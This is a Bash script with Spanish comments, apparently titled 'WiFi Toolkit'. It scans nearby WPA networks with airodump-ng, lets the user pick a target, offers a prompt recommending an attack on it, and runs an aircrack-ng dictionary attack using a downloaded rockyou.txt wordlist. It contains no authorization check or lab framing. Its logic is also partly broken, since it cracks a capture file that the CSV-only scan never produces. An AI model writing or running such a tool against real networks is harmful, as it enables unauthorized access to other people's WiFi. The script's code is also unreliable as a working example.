#!/bin/bash

# Colores para la salida
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
ORANGE='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # Sin color

# Configuración del proyecto
PROJECT_NAME="wifi_toolkit"
DOWNLOADS_DIR="$HOME/Downloads"
PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog")

# Verificar permisos de administrador
check_permissions() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Este script debe ejecutarse como administrador. Usa 'sudo'.${NC}"
        exit 1
    fi
}

# Instalar dependencias necesarias
install_dependencies() {
    dialog --title "Instalación de Dependencias" --infobox "Verificando dependencias..." 8 40
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            dialog --title "Instalando $dep" --infobox "Instalando $dep..." 8 40
            sudo apt-get install -y "$dep" &>/dev/null || {
                dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
                exit 1
            }
        fi
    done
    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
}

# Crear carpetas del proyecto
prepare_project_directory() {
    mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
    sudo chmod -R 777 "$RESULTS_DIR"
}

# Escaneo en vivo de redes WiFi
live_scan_networks() {
    local interface=$(detect_wireless_interface)
    if [[ -z "$interface" ]]; then
        dialog --title "Error" --msgbox "No se detectó una interfaz inalámbrica compatible." 8 40
        return
    fi

    dialog --title "Escaneo en Vivo" --infobox "Escaneando redes durante 60 segundos..." 8 40

    # Ejecutar airodump-ng y guardar log de errores
    xterm -geometry 80x24+0+0 -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/live_scan" 2> "$RESULTS_DIR/airodump_error.log" &
    sleep 60
    killall airodump-ng

    if [[ ! -f "$RESULTS_DIR/live_scan-01.csv" ]]; then
        # Mostrar error detallado
        local error_message=$(cat "$RESULTS_DIR/airodump_error.log")
        dialog --title "Error" --msgbox "El archivo de resultados no se generó.\nError: $error_message" 15 50
        return
    fi
    show_scan_results "$RESULTS_DIR/live_scan-01.csv"
}

# Detectar interfaz inalámbrica
detect_wireless_interface() {
    iw dev | grep Interface | awk '{print $2}' | head -n 1
}

# Mostrar resultados del escaneo
show_scan_results() {
    local scan_file=$1
    local networks=()

    while IFS=, read -r bssid pwr beacons data mb enc cipher auth essid; do
        if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            local color="$NC"
            if ((pwr > -30)); then
                color="$GREEN"
            elif ((pwr > -50)); then
                color="$ORANGE"
            elif ((pwr > -70)); then
                color="$YELLOW"
            else
                color="$RED"
            fi
            networks+=("$bssid" "${color}${essid} (${pwr} dBm)${NC}")
        fi
    done < <(grep WPA "$scan_file")

    if [[ ${#networks[@]} -eq 0 ]]; then
        dialog --title "Redes Encontradas" --msgbox "No se encontraron redes WPA/WPA2/WPA3." 8 40
        return
    fi

    local choice=$(dialog --title "Redes Encontradas" --menu "Seleccione una red para analizar:" 20 60 10 "${networks[@]}" 3>&1 1>&2 2>&3)

    if [[ -n "$choice" ]]; then
        recommend_and_attack "$choice"
    fi
}

# Recomendar red y atacar
recommend_and_attack() {
    local bssid=$1
    dialog --title "Recomendación" --yesno "Se recomienda atacar la red $bssid. ¿Desea continuar?" 8 40

    if [[ $? -eq 0 ]]; then
        perform_attack "$bssid"
    else
        dialog --title "Cancelado" --msgbox "El ataque ha sido cancelado por el usuario." 8 40
    fi
}

# Realizar ataque
perform_attack() {
    local bssid=$1
    local dictionary=$(find_or_download_dictionary)

    dialog --title "Ataque" --infobox "Iniciando ataque contra $bssid..." 8 40
    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/live_scan-01.cap" &
}

# Buscar o descargar diccionario rockyou.txt
find_or_download_dictionary() {
    local dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
    if [[ -z "$dictionary_path" ]]; then
        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
        dictionary_path="$PROJECT_DIR/rockyou.txt"
    fi
    echo "$dictionary_path"
}

# Menú principal
main_menu() {
    while true; do
        option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 20 60 10 \
            1 "Instalar dependencias" \
            2 "Escaneo en vivo de redes" \
            3 "Listar y analizar redes" \
            4 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) install_dependencies ;;
            2) live_scan_networks ;;
            3) show_scan_results "$RESULTS_DIR/live_scan-01.csv" ;;
            4) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción no válida." 8 40 ;;
        esac
    done
}

# Inicio del script
check_permissions
prepare_project_directory
main_menu
